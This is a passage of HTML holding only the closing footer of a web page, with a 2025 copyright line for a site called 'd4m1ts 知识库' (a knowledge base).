footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 d4m1ts 知识库.</div></div></div></footer></div>
</body>
</html>